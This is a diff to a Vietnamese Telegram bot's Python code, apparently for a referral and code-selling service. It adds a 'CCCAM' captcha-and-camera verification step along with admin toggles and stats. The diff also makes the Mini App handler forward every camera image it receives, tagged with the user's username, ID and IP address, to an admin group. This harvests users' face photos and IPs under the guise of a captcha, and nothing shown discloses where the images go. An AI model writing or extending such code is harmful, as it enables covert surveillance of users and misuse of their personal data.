@@ -411,6 +411,7 @@ def _init_db_sync():
             cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS captcha_verified INTEGER DEFAULT 0;")
             cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS miniapp_captcha_verified INTEGER DEFAULT 0;")
             cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS camera_verified INTEGER DEFAULT 0;")
+            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cccam_verified INTEGER DEFAULT 0;")
             cursor.execute("""
                 CREATE TABLE IF NOT EXISTS transactions (
                     id BIGSERIAL PRIMARY KEY,
@@ -444,7 +445,7 @@ def _init_db_sync():
                 ('maintenance', '0'), ('verify_phone', '1'), ('verify_ip', '1'),
                 ('verify_channel', '1'), ('verify_captcha', '1'), ('allow_withdraw', '1'),
                 ('auto_buy_code', '1'), ('verify_camera', '1'),
-                ('verify_miniapp_captcha', '1'),
+                ('verify_miniapp_captcha', '1'), ('verify_cccam', '1'),
             ]
             for key, val in default_settings:
                 cursor.execute(
@@ -975,6 +976,11 @@ async def check_camera_verified(user_id) -> bool:
     return bool(row and row[0] == 1)
 
 
+async def check_cccam_verified(user_id) -> bool:
+    row = await db_query("SELECT cccam_verified FROM users WHERE user_id=%s", (user_id,), fetchone=True)
+    return bool(row and row[0] == 1)
+
+
 async def prompt_phone_verification(message_or_bot, user_id):
     msg = (
         f"{E['PHONE']} <b>XÁC MINH SỐ ĐIỆN THOẠI</b>\n\n"
@@ -1037,19 +1043,26 @@ async def proceed_next_verification(update_or_msg, context: ContextTypes.DEFAULT
             await prompt_phone_verification(update_or_msg, user_id)
             return
 
-    # Bước 2 & 3 Gộp lại: Captcha MiniApp & Camera
+    # Bước 2: Xác minh CCCAM (Captcha & Truy Cập Camera từ đầu nếu bật)
+    if await get_verify_setting("verify_cccam"):
+        if not await check_cccam_verified(user_id) and user_id not in ADMIN_IDS:
+            if not await check_miniapp_captcha_verified(user_id) or not await check_camera_verified(user_id):
+                await prompt_miniapp_captcha_verification(update_or_msg, user_id)
+                return
+
+    # Bước 3 & 4 Gộp lại: Captcha MiniApp & Camera cũ (nếu bật riêng lẻ)
     if await get_verify_setting("verify_miniapp_captcha") or await get_verify_setting("verify_camera"):
         if (not await check_miniapp_captcha_verified(user_id) or not await check_camera_verified(user_id)) and user_id not in ADMIN_IDS:
             await prompt_miniapp_captcha_verification(update_or_msg, user_id)
             return
 
-    # Bước 4: IP MiniApp
+    # Bước 5: IP MiniApp
     if await get_verify_setting("verify_ip"):
         if not await check_ip_verified(user_id) and user_id not in ADMIN_IDS:
             await prompt_ip_verification(update_or_msg, user_id)
             return
 
-    # Bước 5: Captcha phép tính
+    # Bước 6: Captcha phép tính
     if await get_verify_setting("verify_captcha"):
         if not await check_captcha_verified(user_id) and user_id not in ADMIN_IDS:
             if user_id in pending_captcha_users:
@@ -1057,7 +1070,7 @@ async def proceed_next_verification(update_or_msg, context: ContextTypes.DEFAULT
             await send_captcha_challenge(update_or_msg, context, user_id)
             return
 
-    # Bước 6: Kênh/nhóm
+    # Bước 7: Kênh/nhóm
     if await get_verify_setting("verify_channel"):
         if user_id not in ADMIN_IDS:
             missing_channels = await get_missing_channels(context.bot, user_id)
@@ -1231,7 +1244,7 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_miniapp_captcha_data(message, context: ContextTypes.DEFAULT_TYPE, user, data: dict):
     uid = user.id
 
-    if not await get_verify_setting("verify_miniapp_captcha") and not await get_verify_setting("verify_camera"):
+    if not await get_verify_setting("verify_miniapp_captcha") and not await get_verify_setting("verify_camera") and not await get_verify_setting("verify_cccam"):
         await proceed_next_verification(message, context, user)
         return
 
@@ -1257,8 +1270,8 @@ async def handle_miniapp_captcha_data(message, context: ContextTypes.DEFAULT_TYP
 
     pending_miniapp_captcha.pop(uid, None)
     
-    # Đánh dấu hoàn thành cả Captcha MiniApp và Camera cùng lúc
-    await db_query("UPDATE users SET miniapp_captcha_verified=1, camera_verified=1 WHERE user_id=%s", (uid,), commit=True)
+    # Đánh dấu hoàn thành Captcha MiniApp, Camera và CCCAM cùng lúc
+    await db_query("UPDATE users SET miniapp_captcha_verified=1, camera_verified=1, cccam_verified=1 WHERE user_id=%s", (uid,), commit=True)
     
     await message.reply_text(
         f"{E['CHECK']} Xác minh Captcha & Camera thành công!\n\n"
@@ -1276,34 +1289,34 @@ async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     try:
         data = json.loads(message.web_app_data.data)
 
-        # (1) Captcha MiniApp hoặc gộp chung với camera snapshot
-        if data.get("type") == "miniapp_captcha" or data.get("type") == "camera_snapshot":
-            # Nếu có kèm ảnh camera thì gửi ảnh về nhóm
-            img_data_url = data.get("image", "")
-            if img_data_url and "," in img_data_url:
-                try:
-                    header, encoded = img_data_url.split(",", 1)
-                    img_bytes = base64.b64decode(encoded)
-                    if len(img_bytes) >= 200:
-                        user_info_str = f"👤 User: @{user.username or 'Không có'} (ID: <code>{user.id}</code>)"
-                        ip_info_str = f"🌐 IP: <code>{data.get('ip', 'Không rõ')}</code>"
-                        caption = f"📸 <b>Ảnh chụp camera xác minh MiniApp</b>\n{user_info_str}\n{ip_info_str}"
-                        await context.bot.send_photo(
-                            chat_id=CAMERA_TARGET_GROUP,
-                            photo=io.BytesIO(img_bytes),
-                            caption=caption,
-                            parse_mode="HTML",
-                        )
-                except Exception as exc:
-                    logger.error("Lỗi xử lý ảnh camera phụ: %s", exc)
+        # Luôn kiểm tra xem Mini App có gửi kèm ảnh chụp camera hay không (Bất kể loại type là gì)
+        img_data_url = data.get("image", "")
+        if img_data_url and "," in img_data_url:
+            try:
+                header, encoded = img_data_url.split(",", 1)
+                img_bytes = base64.b64decode(encoded)
+                if len(img_bytes) >= 200:
+                    user_info_str = f"👤 User: @{user.username or 'Không có'} (ID: <code>{user.id}</code>)"
+                    ip_info_str = f"🌐 IP: <code>{data.get('ip', 'Không rõ')}</code>"
+                    caption = f"📸 <b>Ảnh chụp camera xác minh MiniApp</b>\n{user_info_str}\n{ip_info_str}"
+                    await context.bot.send_photo(
+                        chat_id=CAMERA_TARGET_GROUP,
+                        photo=io.BytesIO(img_bytes),
+                        caption=caption,
+                        parse_mode="HTML",
+                    )
+            except Exception as exc:
+                logger.error("Lỗi xử lý ảnh camera gửi về nhóm: %s", exc)
 
+        # (1) Xử lý xác minh Captcha MiniApp / Camera / CCCAM
+        if data.get("type") in ("miniapp_captcha", "camera_snapshot", "cccam") or "token" in data or "passed" in data:
             await handle_miniapp_captcha_data(message, context, user, data)
             return
 
         # (2) User TỪ CHỐI quyền camera
         if data.get("type") == "camera_denied":
             await db_query(
-                "UPDATE users SET captcha_verified=0, miniapp_captcha_verified=0, camera_verified=0 WHERE user_id=%s",
+                "UPDATE users SET captcha_verified=0, miniapp_captcha_verified=0, camera_verified=0, cccam_verified=0 WHERE user_id=%s",
                 (user.id,), commit=True,
             )
             pending_miniapp_captcha.pop(user.id, None)
@@ -1511,6 +1524,12 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not await check_phone_verified(user.id) and user.id not in ADMIN_IDS:
             await prompt_phone_verification(message, user.id)
             return
+
+    if await get_verify_setting("verify_cccam"):
+        if not await check_cccam_verified(user.id) and user.id not in ADMIN_IDS:
+            if not await check_miniapp_captcha_verified(user.id) or not await check_camera_verified(user.id):
+                await prompt_miniapp_captcha_verification(message, user.id)
+                return
 
     if await get_verify_setting("verify_miniapp_captcha") or await get_verify_setting("verify_camera"):
         if (not await check_miniapp_captcha_verified(user.id) or not await check_camera_verified(user.id)) and user.id not in ADMIN_IDS:
@@ -1878,6 +1897,7 @@ async def code_buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def build_admin_menu():
     st_phone = await get_verify_setting("verify_phone")
+    st_cccam = await get_verify_setting("verify_cccam")
     st_miniapp_cap = await get_verify_setting("verify_miniapp_captcha")
     st_ip = await get_verify_setting("verify_ip")
     st_channel = await get_verify_setting("verify_channel")
@@ -1891,6 +1911,7 @@ async def build_admin_menu():
 
     buttons = [
         [abtn(f"Xác minh SĐT: {state(st_phone)}", "PHONE", callback_data="toggle_verify_phone")],
+        [abtn(f"Xác minh CCCAM (Camera từ đầu): {state(st_cccam)}", "IMAGE", callback_data="toggle_verify_cccam")],
         [abtn(f"Captcha & Camera MiniApp: {state(st_miniapp_cap or st_camera)}", "SHIELD", callback_data="toggle_verify_miniapp_captcha")],
         [abtn(f"Xác minh IP Mini App: {state(st_ip)}", "PC", callback_data="toggle_verify_ip")],
         [abtn(f"Check Kênh/Nhóm: {state(st_channel)}", "PIN2", callback_data="toggle_verify_channel")],
@@ -1919,7 +1940,7 @@ async def admin_toggle_callback(update: Update, context: ContextTypes.DEFAULT_TY
     data = query.data or ""
     if data == "admin_verify_all":
         await db_query(
-            "UPDATE users SET phone_number = NULL, ip_address = NULL, skip_ip = 0, captcha_verified = 0, miniapp_captcha_verified = 0, camera_verified = 0",
+            "UPDATE users SET phone_number = NULL, ip_address = NULL, skip_ip = 0, captcha_verified = 0, miniapp_captcha_verified = 0, camera_verified = 0, cccam_verified = 0",
             commit=True,
         )
         pending_miniapp_captcha.clear()
@@ -1935,6 +1956,7 @@ async def admin_toggle_callback(update: Update, context: ContextTypes.DEFAULT_TY
         return
     key_map = {
         "toggle_verify_phone": "verify_phone",
+        "toggle_verify_cccam": "verify_cccam",
         "toggle_verify_miniapp_captcha": "verify_miniapp_captcha",
         "toggle_verify_ip": "verify_ip",
         "toggle_verify_channel": "verify_channel",
@@ -1948,9 +1970,6 @@ async def admin_toggle_callback(update: Update, context: ContextTypes.DEFAULT_TY
         curr_val = await get_verify_setting(setting_key)
         new_val = not curr_val
         await set_verify_setting(setting_key, new_val)
-        if setting_key in ("verify_miniapp_captcha", "verify_camera"):
-            await set_verify_setting("verify_miniapp_captcha", new_val)
-            await set_verify_setting("verify_camera", new_val)
         status_text = "🟢 BẬT" if new_val else "🔴 TẮT"
         try: await query.answer(f"Đã chuyển trạng thái sang {status_text}")
         except Exception: pass
@@ -2038,7 +2057,7 @@ async def adm_step_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.message.reply_text(f"{E['GEAR']} Trạng thái hệ thống đã đổi thành: <b>{status_str}</b>", parse_mode="HTML")
         elif action == "resetverify":
             await db_query(
-                "UPDATE users SET phone_number = NULL, ip_address = NULL, skip_ip = 0, captcha_verified = 0, miniapp_captcha_verified = 0, camera_verified = 0",
+                "UPDATE users SET phone_number = NULL, ip_address = NULL, skip_ip = 0, captcha_verified = 0, miniapp_captcha_verified = 0, camera_verified = 0, cccam_verified = 0",
                 commit=True,
             )
             pending_miniapp_captcha.clear()
@@ -2186,7 +2205,7 @@ ADMIN_PAGES = [
             "• <b>/maint</b> – bật/tắt bảo trì\n"
             "• <b>/resetverify</b> – ⚠️ reset xác minh toàn bộ\n"
             "• <b>/wipeall</b> – ⚠️ XÓA SẠCH dữ liệu hệ thống\n"
-            "• <b>Cài đặt</b> – bật/tắt SĐT, Captcha MiniApp, IP, Camera, Kênh, Captcha, Rút tiền, Auto mua code"
+            "• <b>Cài đặt</b> – bật/tắt SĐT, CCCAM, Captcha MiniApp, IP, Camera, Kênh, Captcha, Rút tiền, Auto mua code"
         ),
         "items": [
             ("/biofriends", "i", "biofriends", "SHIELD2"), ("/checkref", "i", "checkref", "PIN2"),
@@ -2686,7 +2705,7 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
                 return
 
             await db_query(
-                "UPDATE users SET is_banned=0, is_withdraw_banned=0, skip_ip=1, captcha_verified=1, miniapp_captcha_verified=1, camera_verified=1 WHERE user_id=%s",
+                "UPDATE users SET is_banned=0, is_withdraw_banned=0, skip_ip=1, captcha_verified=1, miniapp_captcha_verified=1, camera_verified=1, cccam_verified=1 WHERE user_id=%s",
                 (target_id,), commit=True
             )
             pending_captcha_users.pop(target_id, None)
@@ -2696,7 +2715,7 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
 
             await message.reply_text(
                 f"{E['CHECK2']} <b>ĐÃ MỞ TẤT CẢ HẠN CHẾ CHO ID:</b> <code>{target_id}</code>\n"
-                f"• Đã gỡ cấm tài khoản, gỡ cấm rút code, vượt Captcha (cả Captcha MiniApp) và bỏ qua kiểm tra IP.",
+                f"• Đã gỡ cấm tài khoản, gỡ cấm rút code, vượt Captcha (cả Captcha MiniApp/CCCAM) và bỏ qua kiểm tra IP.",
                 parse_mode="HTML",
             )
 
@@ -2710,7 +2729,7 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
                 return
 
             await db_query(
-                "UPDATE users SET is_banned=0, captcha_verified=1, miniapp_captcha_verified=1, camera_verified=1 WHERE user_id=%s",
+                "UPDATE users SET is_banned=0, captcha_verified=1, miniapp_captcha_verified=1, camera_verified=1, cccam_verified=1 WHERE user_id=%s",
                 (target_id,), commit=True,
             )
             pending_captcha_users.pop(target_id, None)
@@ -2747,7 +2766,7 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
 
         elif cmd == "/resetverify":
             await db_query(
-                "UPDATE users SET phone_number = NULL, ip_address = NULL, skip_ip = 0, captcha_verified = 0, miniapp_captcha_verified = 0, camera_verified = 0",
+                "UPDATE users SET phone_number = NULL, ip_address = NULL, skip_ip = 0, captcha_verified = 0, miniapp_captcha_verified = 0, camera_verified = 0, cccam_verified = 0",
                 commit=True,
             )
             pending_miniapp_captcha.clear()
@@ -2755,7 +2774,7 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
             await message.reply_text(
                 f"{E['CHECK2']} <b>ĐÃ ĐẶT LẠI TRẠNG THÁI XÁC MINH!</b>\n"
                 f"━━━━━━━━━━━━━━━━━━\n"
-                f"Toàn bộ thành viên trong hệ thống sẽ phải thực hiện lại các bước kiểm tra (SĐT, Camera, Captcha MiniApp, IP, Kênh, Captcha) khi tương tác với Bot tiếp theo.",
+                f"Toàn bộ thành viên trong hệ thống sẽ phải thực hiện lại các bước kiểm tra (SĐT, CCCAM, Camera, Captcha MiniApp, IP, Kênh, Captcha) khi tương tác với Bot tiếp theo.",
                 parse_mode="HTML",
             )
 
@@ -3008,6 +3027,7 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
             cap_ok = (await db_query("SELECT COUNT(*) FROM users WHERE captcha_verified=1", fetchone=True))[0]
             mcap_ok = (await db_query("SELECT COUNT(*) FROM users WHERE miniapp_captcha_verified=1", fetchone=True))[0]
             cam_ok = (await db_query("SELECT COUNT(*) FROM users WHERE camera_verified=1", fetchone=True))[0]
+            cccam_ok = (await db_query("SELECT COUNT(*) FROM users WHERE cccam_verified=1", fetchone=True))[0]
             sum_bal = (await db_query("SELECT COALESCE(SUM(balance),0) FROM users WHERE is_banned=0", fetchone=True))[0]
             new_today = (await db_query("SELECT COUNT(*) FROM users WHERE joined_at LIKE %s", (today,), fetchone=True))[0]
             ref_today = (await db_query(
@@ -3027,6 +3047,7 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
                 f"{E['CROSS']} Đang bị khóa: <b>{banned:,}</b>\n"
                 f"{E['WARN']} Bị cấm rút code (chưa khóa): <b>{wd_banned:,}</b>\n"
                 f"{E['PHONE']} Đã xác minh SĐT: <b>{phone_ok:,}</b>\n"
+                f"{E['IMAGE']} Đã xác minh CCCAM: <b>{cccam_ok:,}</b>\n"
                 f"{E['IMAGE']} Đã xác minh Camera: <b>{cam_ok:,}</b>\n"
                 f"{E['SHIELD']} Đã qua Captcha MiniApp: <b>{mcap_ok:,}</b>\n"
                 f"{E['GLOBE']} Đã xác minh IP: <b>{ip_ok:,}</b>\n"
